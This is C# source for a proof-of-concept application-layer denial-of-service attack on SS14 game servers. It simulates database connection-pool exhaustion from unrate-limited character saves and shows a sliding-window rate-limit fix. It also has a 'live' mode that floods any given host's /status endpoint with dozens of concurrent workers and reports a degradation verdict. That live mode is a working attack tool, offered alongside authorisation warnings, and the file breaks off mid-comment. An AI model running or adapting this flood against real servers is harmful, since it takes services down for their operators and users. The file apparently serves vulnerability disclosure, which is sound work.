/*
 * PoC: L7 Application-Layer DDoS via Unbounded Async DB Writes
 * ─────────────────────────────────────────────────────────────
 *
 * Vulnerability Pattern (found in game-server codebase):
 *
 *   Content.Server/Preferences/Managers/ServerPreferencesManager.cs
 *
 *   private async void HandleUpdateCharacterMessage(MsgUpdateCharacter message)
 *   {
 *       var userId = message.MsgChannel.UserId;
 *       await SetProfile(userId, message.Slot, message.Profile);   // <-- unbounded
 *   }
 *
 *   public async Task SetProfile(...)
 *   {
 *       ...
 *       await _db.SaveCharacterSlotAsync(userId, profile, slot);  // <-- DB write
 *   }
 *
 * Root cause:
 *   There is NO rate limiting between receiving the network message and
 *   initiating an async database write. Any authenticated player can send
 *   MsgUpdateCharacter (character update) packets as fast as the network allows.
 *   Each packet spawns an unbounded Task that competes for the DB connection pool.
 *
 * Attack scenario:
 *   1. Attacker authenticates N accounts (or uses existing account(s)).
 *   2. Each account sends MsgUpdateCharacter in a tight loop (~200 msg/s).
 *   3. The server spawns hundreds of pending async Tasks per attacker.
 *   4. All Tasks queue waiting for a slot in the DB connection pool.
 *   5. Pool exhaustion causes all other DB operations (login, ban checks,
 *      playtime tracking, etc.) to stall → server appears frozen to everyone.
 *
 * Fix demonstrated in Phase 2:
 *   Apply PlayerRateLimitManager (sliding window) — same pattern already used
 *   for chat messages and ahelp in the codebase — limiting each player to
 *   e.g. 3 character saves per 5 seconds. The DB queue depth remains stable.
 *
 * ── Live mode ─────────────────────────────────────────────────────────────────
 *
 * The SS14 server exposes an unauthenticated HTTP endpoint on the same port as
 * the game (default 1212): GET /status  →  JSON with player count / server name.
 * This endpoint shares the StatusHost with the game protocol and has NO rate
 * limiting — identical root cause to MsgUpdateCharacter.
 *
 * Live mode uses /status as a canary + flood target:
 *
 *   Phase L1  Baseline  — 10 sequential /status probes to measure normal RTT.
 *   Phase L2  Flood     — N concurrent workers hammer /status; RTT canary
 *                         runs alongside showing server-response degradation.
 *   Phase L3  Recovery  — Flood stops; canary monitors how long until RTT
 *                         returns to baseline.
 *
 * No authentication, no game-client code. Pure stdlib HttpClient.
 *
 * Usage:
 *   dotnet run                          # local simulation (Phases 1 & 2)
 *   dotnet run -- --auto                # simulation, non-interactive
 *   dotnet run -- --live localhost      # live test on localhost:1212
 *   dotnet run -- --live 192.0.2.5 1212 # explicit host:port
 *
 * Options:
 *   --live <host> [port]     Run against a real server (default port: 1212).
 *   --workers <N>            Concurrent flood workers  (default: 50).
 *   --duration <seconds>     Flood duration            (default: 30).
 *   --timeout <ms>           Per-request timeout       (default: 5000).
 *   --auto                   Skip key prompts (simulation mode only).
 *
 * WARNING: Only use against servers you own or have explicit written
 *          authorisation to test. Unauthorised use is illegal.
 *
 * No external dependencies. Requires .NET 9.
 */

using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Text.Json;

Console.OutputEncoding = Encoding.UTF8;
Console.Title = "L7 DDoS PoC — Unbounded Async Writes / HTTP Flood";

// ── Argument parsing ──────────────────────────────────────────────────────────
bool auto      = args.Contains("--auto");
bool liveMode  = args.Contains("--live");

if (liveMode)
{
    int liveIdx  = Array.IndexOf(args, "--live");
    string host  = liveIdx + 1 < args.Length && !args[liveIdx + 1].StartsWith('-')
                   ? args[liveIdx + 1] : "localhost";
    int port     = 1212;
    if (liveIdx + 2 < args.Length && !args[liveIdx + 2].StartsWith('-')
        && int.TryParse(args[liveIdx + 2], out int parsedPort))
        port = parsedPort;

    int workers = GetArgInt(args, "--workers",  50);
    int durSec  = GetArgInt(args, "--duration", 30);
    int timeout = GetArgInt(args, "--timeout",  5000);

    PrintBannerLive();
    await Phase_Live(host, port, workers, durSec, timeout);
}
else
{
    PrintBanner();
    Prompt("Press any key to start  Phase 1 — VULNERABLE  server...", auto);
    await Phase1_Vulnerable();
    Console.WriteLine();
    Prompt("Press any key to start  Phase 2 — PROTECTED  server...", auto);
    await Phase2_Protected();
}

Console.ForegroundColor = ConsoleColor.DarkGray;
Console.WriteLine("\nPoC complete. Press any key to exit.");
Console.ResetColor();
if (!auto && !liveMode) Console.ReadKey(true);

static int GetArgInt(string[] args, string name, int def)
{
    int i = Array.IndexOf(args, name);
    return i >= 0 && i + 1 < args.Length && int.TryParse(args[i + 1], out int v) ? v : def;
}

// ── Phases ───────────────────────────────────────────────────────────────────

static async Task Phase1_Vulnerable()
{
    const int attackers   = 10;
    const int msgsEach    = 500;
    const int msgDelayMs  =   5; // 200 msg/s per attacker

    Header("PHASE 1: VULNERABLE SERVER  (no rate limiting)", ConsoleColor.Red);
    Console.WriteLine($"  {attackers} attackers × {msgsEach} MsgUpdateCharacter each = {attackers * msgsEach} total");
    Console.WriteLine("  DB connection pool: 10 connections, each write: 20–80 ms");
    Console.WriteLine();

    var db     = new SimulatedDatabase(poolSize: 10, minMs: 20, maxMs: 80);
    var server = new VulnerableServer(db);
    var peak   = new PeakCounter();

    using var cts = new CancellationTokenSource();
    var metrics = MetricsLoopVulnerable(server, db, peak, cts.Token);

    var sw = Stopwatch.StartNew();

    // Simulate N authenticated clients flooding the server
    var attackTasks = Enumerable.Range(0, attackers).Select(async _ =>
    {
        var userId = Guid.NewGuid();
        for (int j = 0; j < msgsEach; j++)
        {
            server.HandleUpdateCharacterMessage(userId, slot: j % 5, profile: $"profile_{j:D4}");
            await Task.Delay(msgDelayMs);
        }
    });

    await Task.WhenAll(attackTasks);

    // Wait for all pending DB tasks to drain (max 60 s)
    var drainDeadline = DateTime.UtcNow.AddSeconds(60);
    while (server.PendingDbTasks > 0 && DateTime.UtcNow < drainDeadline)
        await Task.Delay(300);

    sw.Stop();
    await cts.CancelAsync();
    await Task.WhenAny(metrics, Task.Delay(600));

    Console.WriteLine();
    Console.ForegroundColor = ConsoleColor.Red;
    Console.WriteLine("┌─ Phase 1 Result ──────────────────────────────────────────┐");
    Console.WriteLine($"│  Messages accepted      : {server.MessagesReceived,6}  (all — no filtering)     │");
    Console.WriteLine($"│  DB writes initiated    : {server.MessagesReceived,6}  (1 Task per message)     │");
    Console.WriteLine($"│  DB writes completed    : {db.CompletedWrites,6}                              │");
    Console.WriteLine($"│  Peak concurrent Tasks  : {peak.Value,6}  (pool size = 10)           │");
    Console.WriteLine($"│  Total wall time        : {sw.Elapsed.TotalSeconds,6:F1}s                             │");
    Console.WriteLine($"│  Avg write latency      : {db.AvgWriteMs,6:F1}ms  (incl. queue wait)        │");
    Console.WriteLine("├───────────────────────────────────────────────────────────┤");
    Console.WriteLine($"│  IMPACT: {peak.Value} async Tasks competed for 10 DB connections.   │");
    Console.WriteLine("│  Logins, bans, playtime tracking → stalled for all users. │");
    Console.WriteLine("└───────────────────────────────────────────────────────────┘");
    Console.ResetColor();
}

static async Task Phase2_Protected()
{
    const int attackers   = 10;
    const int msgsEach    = 500;
    const int msgDelayMs  =   5;

    // Rate limit mirrors what's already used for chat/ahelp in the codebase
    const int   limitCount  = 3;
    var         limitPeriod = TimeSpan.FromSeconds(5);

    Header("PHASE 2: PROTECTED SERVER  (sliding-window rate limit per player)", ConsoleColor.Green);
    Console.WriteLine($"  Same {attackers} attackers × {msgsEach} messages");
    Console.WriteLine($"  Rate limit: {limitCount} writes / {limitPeriod.TotalSeconds:F0}s per player  " +
                      $"→ max {limitCount / limitPeriod.TotalSeconds:F1} writes/s per player");
    Console.WriteLine();

    var db     = new SimulatedDatabase(poolSize: 10, minMs: 20, maxMs: 80);
    var server = new ProtectedServer(db, maxPerPeriod: limitCount, period: limitPeriod);
    var peak   = new PeakCounter();

    using var cts = new CancellationTokenSource();
    var metrics = MetricsLoopProtected(server, db, peak, cts.Token);

    var sw = Stopwatch.StartNew();

    var attackTasks = Enumerable.Range(0, attackers).Select(async _ =>
    {
        var userId = Guid.NewGuid();
        for (int j = 0; j < msgsEach; j++)
        {
            server.HandleUpdateCharacterMessage(userId, slot: j % 5, profile: $"profile_{j:D4}");
            await Task.Delay(msgDelayMs);
        }
    });

    await Task.WhenAll(attackTasks);

    var drainDeadline = DateTime.UtcNow.AddSeconds(10);
    while (server.PendingDbTasks > 0 && DateTime.UtcNow < drainDeadline)
        await Task.Delay(200);

    sw.Stop();
    await cts.CancelAsync();
    await Task.WhenAny(metrics, Task.Delay(600));

    double blockPct = server.MessagesReceived > 0
        ? server.MessagesBlocked * 100.0 / server.MessagesReceived
        : 0;

    Console.WriteLine();
    Console.ForegroundColor = ConsoleColor.Green;
    Console.WriteLine("┌─ Phase 2 Result ──────────────────────────────────────────┐");
    Console.WriteLine($"│  Messages received      : {server.MessagesReceived,6}                              │");
    Console.WriteLine($"│  Messages blocked       : {server.MessagesBlocked,6}  ({blockPct:F1}% — attacker waste)   │");
    Console.WriteLine($"│  DB writes initiated    : {server.MessagesReceived - server.MessagesBlocked,6}                              │");
    Console.WriteLine($"│  DB writes completed    : {db.CompletedWrites,6}                              │");
    Console.WriteLine($"│  Peak concurrent Tasks  : {peak.Value,6}  (pool never saturated)       │");
    Console.WriteLine($"│  Total wall time        : {sw.Elapsed.TotalSeconds,6:F1}s                             │");
    Console.WriteLine($"│  Avg write latency      : {db.AvgWriteMs,6:F1}ms  (no queue pressure)       │");
    Console.WriteLine("├───────────────────────────────────────────────────────────┤");
    Console.WriteLine("│  RESULT: DB pool stable. Legitimate ops fully unaffected. │");
    Console.WriteLine("└───────────────────────────────────────────────────────────┘");
    Console.ResetColor();
}

// ── Metrics display ───────────────────────────────────────────────────────────

static async Task MetricsLoopVulnerable(
    VulnerableServer server, SimulatedDatabase db, PeakCounter peak, CancellationToken ct)
{
    const string hdr = "  t(s)  │ Received │ Pending Tasks │ Pool Used │ DB Done │ Avg Wait";
    Console.ForegroundColor = ConsoleColor.DarkGray;
    Console.WriteLine(hdr);
    Console.WriteLine(new string('─', hdr.Length));
    Console.ResetColor();

    var start = Stopwatch.GetTimestamp();
    while (!ct.IsCancellationRequested)
    {
        await Task.Delay(500, ct).ContinueWith(_ => { });
        if (ct.IsCancellationRequested) break;

        var t       = (Stopwatch.GetTimestamp() - start) / (double)Stopwatch.Frequency;
        var pending = server.PendingDbTasks;
        peak.Update(pending);

        // Color escalates as queue grows — shows degradation visually
        Console.ForegroundColor = pending switch
        {
            > 200 => ConsoleColor.DarkRed,
            > 80  => ConsoleColor.Red,
            > 30  => ConsoleColor.Yellow,
            _     => ConsoleColor.Gray
        };

        Console.WriteLine(
            $"  {t,4:F1}s  │ {server.MessagesReceived,8} │ {pending,13} │ " +
            $"{db.ActiveConnections,4}/{db.PoolSize,-4} │ {db.CompletedWrites,7} │ {db.AvgWriteMs,6:F1}ms");
        Console.ResetColor();
    }
}

static async Task MetricsLoopProtected(
    ProtectedServer server, SimulatedDatabase db, PeakCounter peak, CancellationToken ct)
{
    const string hdr = "  t(s)  │ Received │ Blocked │ Pending Tasks │ Pool Used │ DB Done │ Avg Wait";
    Console.ForegroundColor = ConsoleColor.DarkGray;
    Console.WriteLine(hdr);
    Console.WriteLine(new string('─', hdr.Length));
    Console.ResetColor();

    var start = Stopwatch.GetTimestamp();
    while (!ct.IsCancellationRequested)
    {
        await Task.Delay(500, ct).ContinueWith(_ => { });
        if (ct.IsCancellationRequested) break;

        var t       = (Stopwatch.GetTimestamp() - start) / (double)Stopwatch.Frequency;
        var pending = server.PendingDbTasks;
        peak.Update(pending);

        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine(
            $"  {t,4:F1}s  │ {server.MessagesReceived,8} │ {server.MessagesBlocked,7} │ {pending,13} │ " +
            $"{db.ActiveConnections,4}/{db.PoolSize,-4} │ {db.CompletedWrites,7} │ {db.AvgWriteMs,6:F1}ms");
        Console.ResetColor();
    }
}

// ── Live mode ─────────────────────────────────────────────────────────────────

/// <summary>
/// Three-phase live test against a real SS14 server's HTTP StatusHost.
///
/// The /status endpoint processes every request through the handler chain,
/// serializes JSON player counts, and queries server state — with NO rate
/// limiting. This mirrors the root cause of the MsgUpdateCharacter bug:
/// unbounded per-request work triggered by unauthenticated/authenticated callers.
///
/// Phase L1: Baseline  — sequential probes to measure normal round-trip time.
/// Phase L2: Flood     — N concurrent workers send /status as fast as possible
///                       while a canary probe tracks latency degradation.
/// Phase L3: Recovery  — flood stops; canary measures time-to-recover.
/// </summary>
static async Task Phase_Live(string host, int port, int workers, int durSec, int timeoutMs)
{
    var baseUrl = $"http://{host}:{port}";
    var statusUrl = $"{baseUrl}/status";

    Header($"LIVE MODE  →  {baseUrl}", ConsoleColor.Cyan);
    Console.ForegroundColor = ConsoleColor.DarkYellow;
    Console.WriteLine("  ⚠  Only test servers you own or have written authorisation to test.");
    Console.ResetColor();
    Console.WriteLine();

    // Shared HttpClient with connection limit per-server (simulates many open
    // connections — the pool itself is part of the pressure)
    var handler = new SocketsHttpHandler
    {
        PooledConnectionLifetime    = TimeSpan.FromSeconds(5),
        MaxConnectionsPerServer     = workers + 10,
        ConnectTimeout              = TimeSpan.FromMilliseconds(timeoutMs),
        ResponseDrainTimeout        = TimeSpan.FromMilliseconds(500),
    };
    using var http = new HttpClient(handler)
    {
        Timeout = TimeSpan.FromMilliseconds(timeoutMs),
    };
    http.DefaultRequestHeaders.Add("User-Agent", "SS14-L7DDoS-PoC/1.0 (security audit)");

    // \u2500\u2500 Phase L1: Baseline \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    Header("Phase L1: Baseline measurement (10 sequential probes)", ConsoleColor.Cyan);

    // First probe: check reachability
    Console.Write($"  Connecting to {statusUrl} ... ");
    try
    {
        var resp = await http.GetStringAsync(statusUrl);
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("OK");
        Console.ResetColor();
        // Pretty-print server name / player count from JSON
        try
        {
            var json = JsonDocument.Parse(resp);
            if (json.RootElement.TryGetProperty("name", out var name))
                Console.WriteLine($"  Server name  : {name.GetString()}");
            if (json.RootElement.TryGetProperty("players", out var players))
                Console.WriteLine($"  Player count : {players.GetInt32()}");
        }
        catch { /* JSON parse not critical */ }
    }
    catch (Exception ex)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"FAILED — {ex.Message}");
        Console.ResetColor();
        Console.WriteLine("  Cannot reach server. Aborting live test.");
        return;
    }

    Console.WriteLine();

    var baselineSamples = new List<long>(10);
    for (int i = 0; i < 10; i++)
    {
        var (ms, ok) = await ProbeOnce(http, statusUrl);
        baselineSamples.Add(ok ? ms : timeoutMs);
        var color = ok ? (ms < 100 ? ConsoleColor.Green : ConsoleColor.Yellow) : ConsoleColor.Red;
        Console.ForegroundColor = color;
        Console.WriteLine($"    probe {i + 1,2}/10 : {(ok ? $"{ms,5} ms" : "TIMEOUT  ")}");
        Console.ResetColor();
        await Task.Delay(300);
    }

    double baselineAvg = baselineSamples.Average();
    double baselineP95 = Percentile(baselineSamples, 95);
    Console.WriteLine();
    Console.WriteLine($"  Baseline avg : {baselineAvg,6:F1} ms");
    Console.WriteLine($"  Baseline p95 : {baselineP95,6:F1} ms");
    Console.WriteLine();

    // \u2500\u2500 Phase L2: Flood \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    Header($"Phase L2: HTTP flood — {workers} concurrent workers × {durSec}s", ConsoleColor.Red);
    Console.WriteLine("  Flood target  : GET /status  (no rate limiting on server)");
    Console.WriteLine("  Same root cause as MsgUpdateCharacter: unbounded server work per request.");
    Console.WriteLine();

    // Live stats
    var floodSent       = new long[1];
    var floodOk         = new long[1];
    var floodErr        = new long[1];
    var floodTotalMs    = new long[1];
    var floodSamples    = new long[1];

    // Canary stats (separate from flood workers)
    var canarySamples   = new ConcurrentBag<(long ms, bool ok)>();

    using var floodCts = new CancellationTokenSource(TimeSpan.FromSeconds(durSec));

    // Start flood workers
    var floodWorkers = Enumerable.Range(0, workers).Select(async _ =>
    {
        while (!floodCts.Token.IsCancellationRequested)
        {
            Interlocked.Increment(ref floodSent[0]);
            var (ms, ok) = await ProbeOnce(http, statusUrl);
            if (ok)
            {
                Interlocked.Increment(ref floodOk[0]);
                Interlocked.Add(ref floodTotalMs[0], ms);
                Interlocked.Increment(ref floodSamples[0]);
            }
            else
            {
                Interlocked.Increment(ref floodErr[0]);
            }
            // No sleep — saturate as fast as possible
        }
    }).ToArray();

    // Canary worker — independent, one probe every 500 ms
    var canaryTask = Task.Run(async () =>
    {
        while (!floodCts.Token.IsCancellationRequested)
        {
            var sample = await ProbeOnce(http, statusUrl);
            canarySamples.Add(sample);
            await Task.Delay(500).ContinueWith(_ => { });
        }
    });

    // Dashboard
    const string hdr2 = "  t(s) │ Sent   │  OK  │  Err │ Avg RTT  │ Canary RTT │ Degradation";
    Console.ForegroundColor = ConsoleColor.DarkGray;
    Console.WriteLine(hdr2);
    Console.WriteLine(new string('\u2500', hdr2.Length));
    Console.ResetColor();

    var dashStart = Stopwatch.GetTimestamp();
    long prevSent = 0;
    var canarySoFar = new List<long>();

    while (!floodCts.Token.IsCancellationRequested)
    {
        await Task.Delay(1000).ContinueWith(_ => { });
        if (floodCts.Token.IsCancellationRequested) break;

        var t         = (Stopwatch.GetTimestamp() - dashStart) / (double)Stopwatch.Frequency;
        var sent      = Volatile.Read(ref floodSent[0]);
        var ok        = Volatile.Read(ref floodOk[0]);
        var err       = Volatile.Read(ref floodErr[0]);
        var samples   = Volatile.Read(ref floodSamples[0]);
        var totalMs   = Volatile.Read(ref floodTotalMs[0]);
        var rps       = sent - prevSent;
        prevSent      = sent;
        double avgRtt = samples > 0 ? (double)totalMs / samples : 0;

        // Latest canary reading
        (long cMs, bool cOk) = canarySamples.TryPeek(out var last) ? last : (0, false);
        // Grab all new canary samples
        while (canarySamples.TryTake(out var s)) { if (s.ok) canarySoFar.Add(s.ms); }

        double canaryLast = cOk ? cMs : double.NaN;
        double degradation = !double.IsNaN(canaryLast) && baselineAvg > 0
                             ? (canaryLast / baselineAvg - 1.0) * 100.0 : double.NaN;

        var color = err > ok ? ConsoleColor.Red
                  : avgRtt > baselineAvg * 3 ? ConsoleColor.Yellow
                  : ConsoleColor.Cyan;
        Console.ForegroundColor = color;

        string canaryStr  = cOk  ? $"{canaryLast,6:F0} ms" : " TIMEOUT";
        string degradeStr = double.IsNaN(degradation) ? "    n/a"
                          : degradation > 0  ? $"+{degradation,5:F0}%"
                          : $" {degradation,5:F0}%";

        Console.WriteLine(
            $"  {t,4:F0}s  │ {rps,5}/s │ {ok,5} │ {err,4} │ {avgRtt,5:F0} ms  │  {canaryStr}  │  {degradeStr}");
        Console.ResetColor();
    }

    await Task.WhenAll(floodWorkers);
    await canaryTask.ContinueWith(_ => { });

    long fSent    = Volatile.Read(ref floodSent[0]);
    long fOk      = Volatile.Read(ref floodOk[0]);
    long fErr     = Volatile.Read(ref floodErr[0]);
    long fSamples = Volatile.Read(ref floodSamples[0]);
    long fTotal   = Volatile.Read(ref floodTotalMs[0]);
    double fAvg   = fSamples > 0 ? (double)fTotal / fSamples : 0;
    double errPct = fSent > 0 ? fErr * 100.0 / fSent : 0;

    double peakCanary  = canarySoFar.Count > 0 ? canarySoFar.Max() : 0;
    double canaryP95   = canarySoFar.Count > 0 ? Percentile(canarySoFar.Select(v => (long)v).ToList(), 95) : 0;

    Console.WriteLine();
    Console.ForegroundColor = ConsoleColor.Red;
    Console.WriteLine("\u250c\u2500 Phase L2 Result \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510");
    Console.WriteLine($"\u2502  Workers          : {workers,5}                                \u2502");
    Console.WriteLine($"\u2502  Duration         : {durSec,5}s                               \u2502");
    Console.WriteLine($"\u2502  Total requests   : {fSent,5}                                \u2502");
    Console.WriteLine($"\u2502  Successful       : {fOk,5}                                \u2502");
    Console.WriteLine($"\u2502  Errors/timeouts  : {fErr,5}  ({errPct,5:F1}%)                    \u2502");
    Console.WriteLine($"\u2502  Avg flood RTT    : {fAvg,5:F0} ms  (baseline: {baselineAvg,4:F0} ms)         \u2502");
    Console.WriteLine($"\u2502  Canary peak RTT  : {peakCanary,5:F0} ms                              \u2502");
    Console.WriteLine($"\u2502  Canary p95 RTT   : {canaryP95,5:F0} ms  (baseline p95: {baselineP95,3:F0} ms)      \u2502");
    Console.WriteLine("\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524");
    double impact = baselineAvg > 0 && canaryP95 > 0 ? canaryP95 / baselineAvg : 0;
    string verdict = impact >= 3 ? "\u2620  CONFIRMED \u2014 server significantly degraded under load." :
                     impact >= 1.5 ? "\u26a0  PARTIAL  \u2014 latency increase observed, may need more workers." :
                     "\u2705  No significant impact (server may be well-resourced or protected).";
    Console.WriteLine($"\u2502  Verdict: {verdict,-44}\u2502");
    Console.WriteLine("\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518");
    Console.ResetColor();

    // \u2500\u2500 Phase L3: Recovery \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
    Console.WriteLine();
    Header("Phase L3: Recovery measurement (30s after flood)", ConsoleColor.Green);
    Console.WriteLine("  Monitoring until latency returns to baseline...");
    Console.WriteLine();

    const string hdr3 = "  t(s) │ RTT     │ vs Baseline │ Status";
    Console.ForegroundColor = ConsoleColor.DarkGray;
    Console.WriteLine(hdr3);
    Console.WriteLine(new string('\u2500', hdr3.Length));
    Console.ResetColor();

    int recoveredCount = 0;
    var recoverStart = Stopwatch.GetTimestamp();
    double recoveryThreshold = baselineAvg * 1.5;

    for (int i = 0; i < 30; i++)
    {
        await Task.Delay(1000);
        var t = (Stopwatch.GetTimestamp() - recoverStart) / (double)Stopwatch.Frequency;
        var (ms, ok) = await ProbeOnce(http, statusUrl);
        double diff = ok && baselineAvg > 0 ? (ms - baselineAvg) : double.NaN;

        bool recovered = ok && ms <= recoveryThreshold;
        if (recovered) recoveredCount++;

        Console.ForegroundColor = !ok ? ConsoleColor.Red
                                : recovered ? ConsoleColor.Green
                                : ConsoleColor.Yellow;

        string diffStr  = double.IsNaN(diff) ? "   n/a" : $"{diff:+#;-#;0,6} ms";
        string status   = !ok ? "TIMEOUT" : recovered ? "RECOVERED" : "elevated";
        Console.WriteLine($"  {t,4:F0}s  │ {(ok ? $"{ms,5} ms" : " TMOUT"),8} │  {diffStr,-14} │ {status}");
        Console.ResetColor();

        if (recoveredCount >= 3) break; // 3 consecutive healthy → stable
    }

    Console.WriteLine();
    double totalRecSec = (Stopwatch.GetTimestamp() - recoverStart) / (double)Stopwatch.Frequency;
    if (recoveredCount >= 3)
    {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine($"  Server recovered in ~{totalRecSec:F1}s after flood stopped.");
    }
    else
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"  Server did NOT fully recover within 30s.");
    }
    Console.ResetColor();
}

/// <summary>Sends a single GET /status and returns (ms, success).</summary>
static async Task<(long ms, bool ok)> ProbeOnce(HttpClient http, string url)
{
    var sw = Stopwatch.StartNew();
    try
    {
        using var resp = await http.GetAsync(url, HttpCompletionOption.ResponseContentRead);
        sw.Stop();
        return (sw.ElapsedMilliseconds, resp.IsSuccessStatusCode);
    }
    catch
    {
        sw.Stop();
        return (sw.ElapsedMilliseconds, false);
    }
}

/// <summary>Returns the given percentile of a sorted sample set.</summary>
static double Percentile(List<long> sorted, int pct)
{
    if (sorted.Count == 0) return 0;
    var copy = sorted.OrderBy(v => v).ToList();
    int idx = (int)Math.Ceiling(pct / 100.0 * copy.Count) - 1;
    return copy[Math.Clamp(idx, 0, copy.Count - 1)];
}

// ── Helpers ───────────────────────────────────────────────────────────────────

static void PrintBannerLive()
{
    Console.ForegroundColor = ConsoleColor.DarkCyan;
    Console.WriteLine("\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557");
    Console.ForegroundColor = ConsoleColor.Cyan;
    Console.WriteLine("\u2551   PoC: L7 DDoS \u2014 Live HTTP Flood Test (SS14 /status endpoint)   \u2551");
    Console.ForegroundColor = ConsoleColor.Gray;
    Console.WriteLine("\u2551   Root cause  : No rate limiting on StatusHost HTTP handler      \u2551");
    Console.WriteLine("\u2551   Same pattern : MsgUpdateCharacter \u2192 SaveCharacterSlotAsync    \u2551");
    Console.ForegroundColor = ConsoleColor.DarkYellow;
    Console.WriteLine("\u2551   \u26a0  Use only on servers you own or have permission to test.    \u2551");
    Console.ForegroundColor = ConsoleColor.DarkCyan;
    Console.WriteLine("\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d");
    Console.ResetColor();
    Console.WriteLine();
}

static void PrintBanner()
{
    Console.ForegroundColor = ConsoleColor.DarkRed;
    Console.WriteLine("╔══════════════════════════════════════════════════════════════════╗");
    Console.WriteLine("║   PoC: L7 DDoS — Unbounded Async DB Writes (No Rate Limiting)   ║");
    Console.ForegroundColor = ConsoleColor.Gray;
    Console.WriteLine("║   Pattern : MsgUpdateCharacter → SaveCharacterSlotAsync          ║");
    Console.WriteLine("║   Impact  : DB connection pool exhaustion → server degradation   ║");
    Console.ForegroundColor = ConsoleColor.DarkGray;
    Console.WriteLine("║   Fix     : Sliding-window rate limit per authenticated player   ║");
    Console.ForegroundColor = ConsoleColor.DarkRed;
    Console.WriteLine("╚══════════════════════════════════════════════════════════════════╝");
    Console.ResetColor();
    Console.WriteLine();
}

static void Prompt(string text, bool auto)
{
    Console.WriteLine(text);
    if (auto)
    {
        Console.WriteLine("(auto mode — continuing)\n");
        return;
    }
    Console.ReadKey(true);
    try { Console.Clear(); } catch { /* not a console, ignore */ }
}

static void Header(string text, ConsoleColor color)
{
    Console.ForegroundColor = color;
    Console.WriteLine($"═══ {text} ═══");
    Console.ResetColor();
}

// ── Core simulation types ─────────────────────────────────────────────────────

/// <summary>
/// Simulates the database layer. A fixed-size connection pool serialises
/// concurrent writes; each write takes a realistic random amount of time.
/// </summary>
sealed class SimulatedDatabase(int poolSize, int minMs, int maxMs)
{
    private readonly SemaphoreSlim _pool = new(poolSize, poolSize);

    private long _completed;
    private long _active;
    private long _totalMs;
    private long _samples;

    public int  PoolSize           => poolSize;
    public long CompletedWrites    => Volatile.Read(ref _completed);
    public long ActiveConnections  => Volatile.Read(ref _active);
    public double AvgWriteMs
    {
        get
        {
            var s = Volatile.Read(ref _samples);
            return s == 0 ? 0 : (double)Volatile.Read(ref _totalMs) / s;
        }
    }

    /// <summary>
    /// Simulates: await _db.SaveCharacterSlotAsync(userId, profile, slot)
    /// </summary>
    public async Task WriteAsync(Guid userId, int slot, string data)
    {
        var sw = Stopwatch.StartNew();

        // Wait for a free DB connection  — this is where the queue builds up
        await _pool.WaitAsync();
        Interlocked.Increment(ref _active);
        try
        {
            await Task.Delay(Random.Shared.Next(minMs, maxMs));
            Interlocked.Increment(ref _completed);
            sw.Stop();
            Interlocked.Add(ref _totalMs, sw.ElapsedMilliseconds);
            Interlocked.Increment(ref _samples);
        }
        finally
        {
            Interlocked.Decrement(ref _active);
            _pool.Release();
        }
    }
}

/// <summary>
